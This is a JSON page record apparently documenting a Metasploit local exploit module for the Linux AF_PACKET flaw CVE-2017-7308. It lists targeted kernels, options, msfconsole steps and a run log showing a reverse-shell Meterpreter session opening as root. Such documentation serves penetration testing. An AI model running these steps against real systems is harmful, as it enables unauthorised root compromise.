{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/linux/local/af_packet_packet_set_ring_priv_esc","result":{"data":{"moduleMetadataJson":{"id":"e24758b0-877e-5afd-865d-daffac5d838a","name":"AF_PACKET packet_set_ring Privilege Escalation","fullname":"exploit/linux/local/af_packet_packet_set_ring_priv_esc","description":"This module exploits a heap-out-of-bounds write in the packet_set_ring\n        function in net/packet/af_packet.c (AF_PACKET) in the Linux kernel\n        to execute code as root (CVE-2017-7308).\n\n        The bug was initially introduced in 2011 and patched in version 4.10.6,\n        potentially affecting a large number of kernels; however this exploit\n        targets only systems using Ubuntu Xenial kernels 4.8.0 < 4.8.0-46,\n        including Linux distros based on Ubuntu Xenial, such as Linux Mint.\n\n        The target system must have unprivileged user namespaces enabled and\n        two or more CPU cores.\n\n        Bypasses for SMEP, SMAP and KASLR are included. Failed exploitation\n        may crash the kernel.\n\n        This module has been tested successfully on Linux Mint 18 (x86_64)\n        with kernel versions:\n\n        4.8.0-34-generic;\n        4.8.0-36-generic;\n        4.8.0-39-generic;\n        4.8.0-41-generic;\n        4.8.0-42-generic;\n        4.8.0-44-generic;\n        4.8.0-45-generic.","rank":400,"fields":{"detailsSlug":"/modules/details/exploit/linux/local/af_packet_packet_set_ring_priv_esc","documentationSlug":"/modules/documentation/exploit/linux/local/af_packet_packet_set_ring_priv_esc","referencesSlug":"/modules/references/exploit/linux/local/af_packet_packet_set_ring_priv_esc"},"documentation":{"html":"<h2 id=\"description\" style=\"position:relative;\"><a href=\"#description\" aria-label=\"description permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Description</h2>\n<p>  This module exploits a heap-out-of-bounds write in the <code class=\"language-text\">packet_set_ring</code>\nfunction in <code class=\"language-text\">net/packet/af_packet.c</code> (<code class=\"language-text\">AF_PACKET</code>) in the Linux kernel\nto execute code as <code class=\"language-text\">root</code> (CVE-2017-7308).</p>\n<p>  The bug was initially introduced in 2011 and patched in version 4.10.6,\npotentially affecting a large number of kernels; however this exploit\ntargets only systems using Ubuntu Xenial kernels 4.8.0 &#x3C; 4.8.0-46,\nincluding Linux distros based on Ubuntu Xenial, such as Linux Mint.</p>\n<p>  The target system must have unprivileged user namespaces enabled and\ntwo or more CPU cores.</p>\n<p>  Bypasses for SMEP, SMAP and KASLR are included. Failed exploitation\nmay crash the kernel.</p>\n<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<p>  This module has been tested successfully on Linux Mint 18 (x86_64)\nwith kernel versions:</p>\n<ul>\n<li>4.8.0-34-generic</li>\n<li>4.8.0-36-generic</li>\n<li>4.8.0-39-generic</li>\n<li>4.8.0-41-generic</li>\n<li>4.8.0-42-generic</li>\n<li>4.8.0-44-generic</li>\n<li>4.8.0-45-generic</li>\n</ul>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<ol>\n<li>Start <code class=\"language-text\">msfconsole</code></li>\n<li>Get a session</li>\n<li><code class=\"language-text\">use af_packet_packet_set_ring_priv_esc</code></li>\n<li><code class=\"language-text\">set SESSION [SESSION]</code></li>\n<li><code class=\"language-text\">check</code></li>\n<li><code class=\"language-text\">run</code></li>\n<li>You should get a new <em>root</em> session</li>\n</ol>\n<h2 id=\"options\" style=\"position:relative;\"><a href=\"#options\" aria-label=\"options permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Options</h2>\n<p>  <strong>SESSION</strong></p>\n<p>  Which session to use, which can be viewed with <code class=\"language-text\">sessions</code></p>\n<p>  <strong>WritableDir</strong></p>\n<p>  A writable directory file system path. (default: <code class=\"language-text\">/tmp</code>)</p>\n<p>  <strong>COMPILE</strong></p>\n<p>  Options: <code class=\"language-text\">Auto</code> <code class=\"language-text\">True</code> <code class=\"language-text\">False</code> (default: <code class=\"language-text\">Auto</code>)</p>\n<p>  Whether the exploit should be live compiled with <code class=\"language-text\">gcc</code> on the target system,\nor uploaded as a pre-compiled binary.</p>\n<p>  <code class=\"language-text\">Auto</code> will first determine if <code class=\"language-text\">gcc</code> is installed to compile live on the system,\nand fall back to uploading a pre-compiled binary.</p>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf5 &gt; use exploit/linux/local/af_packet_packet_set_ring_priv_esc \nmsf5 exploit(linux/local/af_packet_packet_set_ring_priv_esc) &gt; set session 1\nsession =&gt; 1\nmsf5 exploit(linux/local/af_packet_packet_set_ring_priv_esc) &gt; run\n\n[*] Started reverse TCP handler on 172.16.191.188:4444 \n[*] Writing &#39;/tmp/.ZxgWSP2O1.c&#39; (19378 bytes) ...\n[*] Writing &#39;/tmp/.jfPl4uPX2&#39; (207 bytes) ...\n[*] Launching exploit...\n[*] Sending stage (857352 bytes) to 172.16.191.207\n[*] Meterpreter session 2 opened (172.16.191.188:4444 -&gt; 172.16.191.207:41882) at 2018-04-27 19:55:21 -0400\n[+] Deleted /tmp/.ZxgWSP2O1.c\n[+] Deleted /tmp/.ZxgWSP2O1\n[+] Deleted /tmp/.jfPl4uPX2\n\nmeterpreter &gt; getuid\nServer username: uid=0, gid=0, euid=0, egid=0\nmeterpreter &gt; sysinfo\nComputer     : 172.16.191.207\nOS           : LinuxMint 18 (Linux 4.8.0-45-generic)\nArchitecture : x64\nBuildTuple   : i486-linux-musl\nMeterpreter  : x86/linux</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"e24758b0-877e-5afd-865d-daffac5d838a"}}}